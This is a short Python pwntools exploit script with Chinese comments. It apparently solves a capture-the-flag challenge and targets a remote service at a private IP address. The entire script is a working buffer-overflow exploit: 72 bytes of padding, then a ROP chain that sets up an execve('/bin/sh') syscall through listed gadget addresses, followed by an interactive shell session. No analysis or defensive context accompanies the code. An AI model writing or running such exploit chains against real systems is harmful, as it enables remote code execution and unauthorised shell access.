from pwn import *

# 目标程序的地址信息
host = '10.12.153.73'
port = 11612
p = remote(host, port)

# ROP Gadgets 地址
pop_rax = 0x40117e        # pop rax; ret
pop_rdi = 0x401180        # pop rdi; ret
pop_rsi_rdx = 0x401182    # pop rsi; pop rdx; ret
syscall = 0x401185        # syscall
sh_addr = 0x404040        # "/bin/sh" 字符串地址

# 构造ROP链
payload = b'~' * 72                # 填充缓冲区，覆盖返回地址
payload += p64(pop_rdi) + p64(sh_addr)   # 设置 rdi = /bin/sh 地址
payload += p64(pop_rax) + p64(59)       # 设置 rax = 59 (execve)
payload += p64(pop_rsi_rdx) + p64(0) + p64(0)  # 设置 rsi 和 rdx 为 0
payload += p64(syscall)                 # 触发 syscall 指令

# 发送Payload
p.sendlineafter(b"Can you make a syscall?\n", payload)
p.interactive()